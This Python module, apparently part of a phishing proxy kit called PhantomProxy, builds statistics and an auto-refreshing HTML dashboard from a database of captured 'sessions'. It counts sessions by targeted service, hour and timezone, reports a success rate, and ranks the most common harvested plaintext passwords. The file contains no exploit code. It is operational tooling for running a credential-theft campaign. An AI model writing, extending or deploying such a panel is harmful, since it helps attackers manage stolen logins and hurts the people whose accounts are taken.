#!/usr/bin/env python3
"""
PhantomProxy Statistics & Analytics Module
"""

import sqlite3
import json
from datetime import datetime, timedelta
from collections import defaultdict

DB_PATH = '/home/ubuntu/phantom-proxy/phantom.db'

class StatsAnalyzer:
    def __init__(self):
        self.db_path = DB_PATH
    
    def get_connection(self):
        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        return conn
    
    def get_total_sessions(self):
        conn = self.get_connection()
        c = conn.cursor()
        c.execute('SELECT COUNT(*) FROM sessions')
        result = c.fetchone()[0]
        conn.close()
        return result
    
    def get_sessions_today(self):
        conn = self.get_connection()
        c = conn.cursor()
        c.execute('SELECT COUNT(*) FROM sessions WHERE datetime(created_at) > datetime("now", "-1 day")')
        result = c.fetchone()[0]
        conn.close()
        return result
    
    def get_sessions_by_service(self):
        conn = self.get_connection()
        c = conn.cursor()
        c.execute('SELECT service, COUNT(*) as count FROM sessions GROUP BY service ORDER BY count DESC')
        result = {row['service']: row['count'] for row in c.fetchall()}
        conn.close()
        return result
    
    def get_sessions_by_hour(self, hours=24):
        conn = self.get_connection()
        c = conn.cursor()
        c.execute('''
            SELECT strftime('%Y-%m-%d %H:00', created_at) as hour, COUNT(*) as count 
            FROM sessions 
            WHERE datetime(created_at) > datetime("now", ? || ' hours')
            GROUP BY hour 
            ORDER BY hour
        ''', (-hours,))
        result = {row['hour']: row['count'] for row in c.fetchall()}
        conn.close()
        return result
    
    def get_sessions_by_country(self):
        # Простая эмуляция по timezone
        conn = self.get_connection()
        c = conn.cursor()
        c.execute('SELECT timezone, COUNT(*) as count FROM sessions GROUP BY timezone ORDER BY count DESC')
        result = {row['timezone']: row['count'] for row in c.fetchall()}
        conn.close()
        return result
    
    def get_top_passwords(self, limit=10):
        conn = self.get_connection()
        c = conn.cursor()
        c.execute('SELECT password, COUNT(*) as count FROM sessions GROUP BY password ORDER BY count DESC LIMIT ?', (limit,))
        result = {row['password']: row['count'] for row in c.fetchall()}
        conn.close()
        return result
    
    def get_success_rate(self):
        # Эмуляция - считаем что все сессии успешные
        total = self.get_total_sessions()
        return {'total': total, 'success_rate': 100 if total > 0 else 0}
    
    def get_full_stats(self):
        return {
            'total_sessions': self.get_total_sessions(),
            'sessions_today': self.get_sessions_today(),
            'success_rate': self.get_success_rate(),
            'by_service': self.get_sessions_by_service(),
            'by_hour': self.get_sessions_by_hour(24),
            'by_country': self.get_sessions_by_country(),
            'top_passwords': self.get_top_passwords(10),
            'generated_at': datetime.now().isoformat()
        }
    
    def generate_html_report(self):
        stats = self.get_full_stats()
        
        html = f'''<!DOCTYPE html>
<html>
<head>
    <title>PhantomProxy Statistics</title>
    <meta http-equiv="refresh" content="60">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: 'Segoe UI', Arial, sans-serif; background: #1a1a2e; color: #eee; padding: 40px; }}
        h1 {{ color: #e94560; margin-bottom: 30px; }}
        .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 40px; }}
        .stat-card {{ background: #16213e; padding: 30px; border-radius: 10px; text-align: center; }}
        .stat-value {{ font-size: 48px; font-weight: bold; color: #e94560; }}
        .stat-label {{ color: #aaa; margin-top: 10px; }}
        .section {{ background: #16213e; padding: 30px; border-radius: 10px; margin-bottom: 30px; }}
        h2 {{ color: #e94560; margin-bottom: 20px; }}
        table {{ width: 100%; border-collapse: collapse; }}
        th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #333; }}
        th {{ background: #0f3460; }}
        tr:hover {{ background: #0f3460; }}
        .chart {{ height: 300px; display: flex; align-items: flex-end; gap: 5px; }}
        .bar {{ background: #e94560; flex: 1; min-width: 20px; border-radius: 4px 4px 0 0; position: relative; }}
        .bar span {{ position: absolute; bottom: -25px; left: 50%; transform: translateX(-50%); font-size: 10px; }}
    </style>
</head>
<body>
    <h1>📊 PhantomProxy Statistics</h1>
    
    <div class="stats">
        <div class="stat-card">
            <div class="stat-value">{stats['total_sessions']}</div>
            <div class="stat-label">Total Sessions</div>
        </div>
        <div class="stat-card">
            <div class="stat-value">{stats['sessions_today']}</div>
            <div class="stat-label">Today</div>
        </div>
        <div class="stat-card">
            <div class="stat-value">{stats['success_rate']['success_rate']}%</div>
            <div class="stat-label">Success Rate</div>
        </div>
        <div class="stat-card">
            <div class="stat-value">{len(stats['by_service'])}</div>
            <div class="stat-label">Services</div>
        </div>
    </div>
    
    <div class="section">
        <h2>🏢 By Service</h2>
        <table>
            <tr><th>Service</th><th>Sessions</th></tr>
            {"".join(f"<tr><td>{k}</td><td>{v}</td></tr>" for k, v in stats['by_service'].items())}
        </table>
    </div>
    
    <div class="section">
        <h2>🕐 Sessions by Hour (24h)</h2>
        <div class="chart">
            {"".join(f'<div class="bar" style="height: {max(10, v * 10)}px;"><span>{k.split()[1]}</span></div>' for k, v in list(stats['by_hour'].items())[-12:])}
        </div>
    </div>
    
    <div class="section">
        <h2>🔑 Top Passwords</h2>
        <table>
            <tr><th>Password</th><th>Count</th></tr>
            {"".join(f"<tr><td>{k}</td><td>{v}</td></tr>" for k, v in stats['top_passwords'].items())}
        </table>
    </div>
    
    <div class="section">
        <h2>🌍 By Timezone</h2>
        <table>
            <tr><th>Timezone</th><th>Sessions</th></tr>
            {"".join(f"<tr><td>{k}</td><td>{v}</td></tr>" for k, v in list(stats['by_country'].items())[:10])}
        </table>
    </div>
    
    <p style="text-align: center; color: #666; margin-top: 40px;">
        Generated: {stats['generated_at']} | Auto-refresh: 60s
    </p>
</body>
</html>'''
        
        return html

if __name__ == '__main__':
    analyzer = StatsAnalyzer()
    print(json.dumps(analyzer.get_full_stats(), indent=2))
